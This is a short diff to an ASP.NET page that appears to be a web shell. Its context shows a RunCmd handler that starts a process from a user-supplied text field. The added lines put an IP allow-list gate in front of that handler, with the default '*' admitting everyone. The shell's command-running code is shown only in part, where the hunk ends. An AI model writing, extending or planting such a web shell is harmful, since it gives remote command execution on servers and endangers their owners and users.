@@ -14,6 +14,32 @@
 
 <script runat="server">      
 
+Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
+  Dim ipAddress As String = Request.UserHostAddress
+
+  If String.IsNullOrEmpty(ipAddress) Then
+    Call DenyAccess()
+  Else
+    Dim strAllowedIPs As String = "*"
+
+    strAllowedIPs = Replace(Trim(strAllowedIPs), " ", "")
+    Dim arrAllowedIPs = Split(strAllowedIPs, ",")
+    Dim match As Integer = Array.IndexOf(arrAllowedIPs, ipAddress)
+
+    If strAllowedIPs <> "*" And match < 0 Then
+      Call DenyAccess()
+    End If
+  End If
+End Sub
+
+
+Protected Sub DenyAccess()
+  Response.Clear
+  Response.StatusCode = 403
+  Response.End
+End Sub
+
+
 Protected Sub RunCmd(sender As Object, e As System.Web.UI.WebControls.CommandEventArgs)
   Dim myProcess As New Process()            
   Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            
